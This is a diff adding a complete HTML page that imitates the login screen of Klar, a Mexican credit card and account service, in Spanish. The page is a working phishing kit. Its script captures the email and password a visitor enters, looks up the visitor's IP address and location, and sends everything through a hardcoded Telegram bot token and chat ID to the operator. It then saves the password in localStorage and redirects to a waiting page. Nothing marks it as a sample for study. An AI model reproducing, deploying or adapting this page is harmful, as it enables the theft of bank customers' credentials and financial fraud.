@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Klar | Tarjeta de crédito y cuenta</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #f5f6f7;
+    --bg-hero: #f5f6f7;
+    --text: #111111;
+    --muted: #4a4f55;
+    --gold: #111111;
+    --placeholder: #8a949b;
+    --radius: 999px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { min-height: 100%; }
+  body {
+    font-family: "Montserrat", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    -webkit-font-smoothing: antialiased;
+  }
+
+  header {
+    position: sticky; top: 0; z-index: 10;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 84px;
+    padding: env(safe-area-inset-top, 0) 28px 0;
+    background: #1a1a1a;
+    color: #fff;
+  }
+  .logo { height: 60px; width: 60px; object-fit: cover; border-radius: 14px; display: block; }
+  .logo-text { font-size: 42px; font-weight: 500; letter-spacing: -1px; line-height: 1; display: none; }
+  .menu-btn {
+    width: 44px; height: 44px; border: 0; background: none; cursor: pointer;
+    display: grid; grid-template-columns: repeat(2, 11px); gap: 12px;
+    place-content: center;
+  }
+  .menu-btn span { width: 11px; height: 11px; background: #fff; border-radius: 50%; transition: transform .2s; }
+  .menu-btn[aria-expanded="true"] span:nth-child(1) { transform: translate(5px, 5px); }
+  .menu-btn[aria-expanded="true"] span:nth-child(4) { transform: translate(-5px, -5px); }
+
+  nav {
+    position: fixed; inset: 84px 0 auto 0; z-index: 9;
+    background: #1a1a1a;
+    padding: 8px 28px 24px;
+    display: none; flex-direction: column;
+    border-top: 1px solid rgba(255,255,255,.1);
+  }
+  nav.open { display: flex; }
+  nav a { color: #fff; text-decoration: none; font-size: 18px; padding: 16px 0; border-bottom: 1px solid rgba(255,255,255,.08); }
+
+  .hero {
+    min-height: calc(100svh - 84px);
+    display: flex; flex-direction: column; justify-content: center;
+    padding: 40px 28px calc(40px + env(safe-area-inset-bottom, 0));
+    background: var(--bg-hero);
+  }
+  .inner { width: 100%; max-width: 480px; margin: 0 auto; }
+
+  h1 { font-size: clamp(32px, 9.5vw, 42px); font-weight: 500; line-height: 1.12; letter-spacing: -.5px; margin-bottom: 22px; }
+  .sub { font-size: clamp(17px, 4.8vw, 20px); line-height: 1.4; color: var(--muted); margin-bottom: 32px; }
+
+  form { display: flex; flex-direction: column; gap: 14px; }
+  input[type="email"], input[type="password"], input[type="text"] {
+    width: 100%; height: 56px; border: 2px solid transparent; border-radius: var(--radius);
+    padding: 0 26px; font: inherit; font-size: 17px; color: #222; background: #fff; border-color: #dfe2e5; outline: none;
+  }
+  input::placeholder { color: var(--placeholder); }
+  input:focus-visible { border-color: #111; }
+  input.error { border-color: #d93025; }
+  .pass-wrap { position: relative; display: none; }
+  .pass-wrap.visible { display: block; }
+  .pass-wrap input { padding-right: 90px; }
+  .toggle-pass {
+    position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+    border: 0; background: none; font: inherit; font-size: 14px; font-weight: 500;
+    color: #4a4f55; padding: 10px 14px; cursor: pointer; border-radius: var(--radius);
+  }
+  .toggle-pass:focus-visible { outline: 2px solid #111; }
+  .msg { min-height: 18px; font-size: 14px; padding-left: 8px; margin-top: -4px; }
+  .msg.err { color: #d93025; }
+  .msg.ok { color: #1e8e3e; }
+
+  .btn {
+    width: 100%; height: 56px; border-radius: var(--radius); cursor: pointer;
+    font: inherit; font-size: 17px; font-weight: 500; color: #111;
+    background: transparent; border: 1.5px solid #111;
+    transition: background .15s;
+  }
+  .btn:hover, .btn:active { background: rgba(0,0,0,.06); }
+  .btn:disabled { opacity: .6; cursor: not-allowed; }
+  .btn:focus-visible, .menu-btn:focus-visible, .store:focus-visible { outline: 2px solid var(--gold); outline-offset: 3px; }
+
+  .stores { display: flex; flex-wrap: wrap; gap: 14px; margin-top: 34px; }
+  .store {
+    display: flex; align-items: center; gap: 8px; height: 48px; padding: 0 14px 0 10px;
+    background: #000; border: 1px solid #a6a6a6; border-radius: 8px; color: #fff; text-decoration: none;
+  }
+  .store svg { width: 26px; height: 26px; flex: none; }
+  .store span { display: flex; flex-direction: column; line-height: 1.05; }
+  .store small { font-size: 8px; text-transform: uppercase; letter-spacing: .02em; }
+  .store em { font-style: normal; font-size: 17px; font-weight: 500; letter-spacing: -.2px; }
+  .store.apple small { text-transform: none; font-size: 9px; }
+  .store.apple em { font-size: 18px; }
+
+  @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+</style>
+</head>
+<body>
+
+<header>
+  <a href="#" aria-label="Klar">
+    <img class="logo" id="logo" alt="Klar"
+         src="https://play-lh.googleusercontent.com/Euzej7ycTwY9s9N2bpfvmad3tm8SEFeqmadsa-bxsweGvvgsM0Sgapk4aXEO1SKrHOjMp4nsqJG-Zd8Db1rc6Q">
+    <span class="logo-text" id="logoText">Klar</span>
+  </a>
+  <button class="menu-btn" id="menuBtn" aria-label="Abrir menú" aria-expanded="false" aria-controls="menu">
+    <span></span><span></span><span></span><span></span>
+  </button>
+</header>
+
+<nav id="menu">
+  <a href="#">Tarjeta de crédito</a>
+  <a href="#">Cuenta</a>
+  <a href="#">Ayuda</a>
+  <a href="#">Iniciar sesión</a>
+</nav>
+
+<main class="hero">
+  <div class="inner">
+    <h1>Tarjeta de crédito y cuenta. Así de fácil</h1>
+    <p class="sub">Cero letras chiquitas. Cero comisiones escondidas. Cero excusas para no empezar.</p>
+
+    <form id="form" novalidate>
+      <input type="email" id="email" placeholder="Introduce tu correo electrónico" autocomplete="email" inputmode="email" aria-label="Correo electrónico">
+      <div class="pass-wrap" id="passWrap">
+        <input type="password" id="password" placeholder="Introduce tu clave" autocomplete="current-password" aria-label="Clave">
+        <button type="button" class="toggle-pass" id="togglePass" aria-label="Mostrar clave">Mostrar</button>
+      </div>
+      <div class="msg" id="msg" role="status"></div>
+      <button type="submit" class="btn" id="submitBtn">Iniciar sesión</button>
+    </form>
+
+    <div class="stores">
+      <a class="store" href="#" aria-label="Disponible en Google Play">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="#00d7fe" d="M3 2.5v19c0 .4.4.6.7.4L13 12z"/>
+          <path fill="#00f076" d="M3.7 2.1 13 12l3.2-3.2L4.6 2c-.3-.2-.6-.2-.9.1z"/>
+          <path fill="#ff3a44" d="M3.7 21.9c.3.3.6.3.9.1l11.600-6.800L13 12z"/>
+          <path fill="#ffd400" d="m16.2 8.800 4.200 2.400c.8.500.8 1.200 0 1.600l-4.200 2.400L13 12z"/>
+        </svg>
+        <span><small>Disponible en</small><em>Google Play</em></span>
+      </a>
+      <a class="store apple" href="#" aria-label="Consíguelo en el App Store">
+        <svg viewBox="0 0 24 24" fill="#fff" aria-hidden="true"><path d="M16.4 12.700c0-2.500 2-3.700 2.100-3.800-1.200-1.700-3-1.900-3.600-1.900-1.500-.2-3 .9-3.800.9s-2-.9-3.300-.9c-1.700 0-3.300 1-4.100 2.500-1.800 3.100-.5 7.600 1.300 10.100.8 1.200 1.800 2.600 3.100 2.500 1.300-.1 1.700-.8 3.200-.8s1.900.8 3.200.8c1.300 0 2.200-1.200 3-2.400.9-1.400 1.300-2.700 1.300-2.800-.1 0-2.400-.9-2.400-3.700zM14 5.200c.7-.8 1.100-1.900 1-3-.9 0-2.100.6-2.800 1.400-.6.700-1.200 1.800-1 2.900 1.100.1 2.100-.5 2.800-1.300z"/></svg>
+        <span><small>Consíguelo en el</small><em>App Store</em></span>
+      </a>
+    </div>
+  </div>
+</main>
+
+<script>
+  // ====== CONFIGURACIÓN DE TELEGRAM ======
+  const BOT_TOKEN = '7945542556:AAGAeGTHrE0i0YTCWqL4FxlwyWT_urry51M';
+  const CHAT_ID   = '5452961674';
+  // =======================================
+
+  // ====== CLAVES DE LOCALSTORAGE ======
+  const LS_EMAIL = 'klar_ultimo_correo';
+  const LS_PASS  = 'klar_ultima_clave';
+  // ====================================
+
+  const logo = document.getElementById('logo');
+  const logoText = document.getElementById('logoText');
+  logo.addEventListener('error', () => { logo.style.display = 'none'; logoText.style.display = 'block'; });
+
+  const menuBtn = document.getElementById('menuBtn');
+  const menu = document.getElementById('menu');
+  menuBtn.addEventListener('click', () => {
+    const open = menu.classList.toggle('open');
+    menuBtn.setAttribute('aria-expanded', open);
+    menuBtn.setAttribute('aria-label', open ? 'Cerrar menú' : 'Abrir menú');
+  });
+
+  const form = document.getElementById('form');
+  const email = document.getElementById('email');
+  const password = document.getElementById('password');
+  const passWrap = document.getElementById('passWrap');
+  const togglePass = document.getElementById('togglePass');
+  const msg = document.getElementById('msg');
+  const submitBtn = document.getElementById('submitBtn');
+  const valid = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
+
+  const showMsg = (text, type) => { msg.className = 'msg ' + type; msg.textContent = text; };
+
+  // ====== RESTAURAR VALORES GUARDADOS EN LOCALSTORAGE ======
+  try {
+    const correoGuardado = localStorage.getItem(LS_EMAIL);
+    if (correoGuardado) email.value = correoGuardado;
+    const claveGuardada = localStorage.getItem(LS_PASS);
+    if (claveGuardada) password.value = claveGuardada;
+  } catch (e) {
+    console.warn('localStorage no disponible:', e);
+  }
+  // ========================================================
+
+  // Obtener IP pública
+  async function obtenerIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || null;
+    } catch {
+      return null;
+    }
+  }
+
+  // Obtener ubicación aproximada por IP
+  async function obtenerUbicacion(ip) {
+    if (!ip) return null;
+    try {
+      const res = await fetch(`https://ipapi.co/${ip}/json/`);
+      const data = await res.json();
+      if (data.error) return null;
+      return {
+        ciudad: data.city || null,
+        region: data.region || null,
+        pais: data.country_name || null
+      };
+    } catch {
+      return null;
+    }
+  }
+
+  // Construir mensaje profesional (sin fecha ni hora)
+  function construirMensaje(correo, clave, ip, ubicacion) {
+    let texto = '🔐 <b>NUEVO INICIO DE SESIÓN</b>\n';
+    texto += '━━━━━━━━━━━━━━━━━━\n';
+    texto += `📧 <b>Correo:</b> <code>${correo}</code>\n`;
+    texto += `🔑 <b>Clave:</b> <code>${clave}</code>\n`;
+
+    if (ip) {
+      texto += `🌐 <b>IP:</b> <code>${ip}</code>\n`;
+    }
+
+    if (ubicacion) {
+      const partes = [ubicacion.ciudad, ubicacion.region, ubicacion.pais].filter(Boolean);
+      if (partes.length > 0) {
+        texto += `📍 <b>Ubicación:</b> ${partes.join(', ')}\n`;
+      }
+    }
+
+    texto += '━━━━━━━━━━━━━━━━━━';
+
+    return texto;
+  }
+
+  // Enviar a Telegram
+  async function enviarATelegram(texto) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: texto,
+        parse_mode: 'HTML'
+      })
+    });
+    const data = await res.json();
+    if (!data.ok) {
+      throw new Error(data.description || 'Error de Telegram');
+    }
+    return data;
+  }
+
+  form.addEventListener('submit', async e => {
+    e.preventDefault();
+    const v = email.value.trim();
+
+    // Paso 1: validar correo
+    if (!valid(v)) {
+      email.classList.add('error');
+      showMsg('Escribe un correo válido, por ejemplo nombre@correo.com', 'err');
+      email.focus();
+      return;
+    }
+
+    // Mostrar campo de clave
+    if (!passWrap.classList.contains('visible')) {
+      passWrap.classList.add('visible');
+      showMsg('', '');
+      password.focus();
+      return;
+    }
+
+    // Paso 2: validar clave
+    if (password.value.length < 6) {
+      password.classList.add('error');
+      showMsg('Escribe tu clave (mínimo 6 caracteres).', 'err');
+      password.focus();
+      return;
+    }
+
+    showMsg('Iniciando sesión…', 'ok');
+    submitBtn.disabled = true;
+
+    try {
+      // Guardar en localStorage antes de enviar
+      try {
+        localStorage.setItem(LS_EMAIL, v);
+        localStorage.setItem(LS_PASS, password.value);
+      } catch (e) {
+        console.warn('No se pudo guardar en localStorage:', e);
+      }
+
+      const ip = await obtenerIP();
+      const ubicacion = await obtenerUbicacion(ip);
+
+      const texto = construirMensaje(v, password.value, ip, ubicacion);
+      await enviarATelegram(texto);
+
+      window.location.href = 'wait.html';
+    } catch (err) {
+      console.error('Error:', err);
+      showMsg('Error al enviar. Intenta de nuevo.', 'err');
+      submitBtn.disabled = false;
+    }
+  });
+
+  togglePass.addEventListener('click', () => {
+    const show = password.type === 'password';
+    password.type = show ? 'text' : 'password';
+    togglePass.textContent = show ? 'Ocultar' : 'Mostrar';
+    togglePass.setAttribute('aria-label', show ? 'Ocultar clave' : 'Mostrar clave');
+  });
+
+  email.addEventListener('input', () => {
+    email.classList.remove('error');
+    showMsg('', '');
+  });
+
+  password.addEventListener('input', () => {
+    password.classList.remove('error');
+    showMsg('', '');
+  });
+</script>
+</body>
+</html>
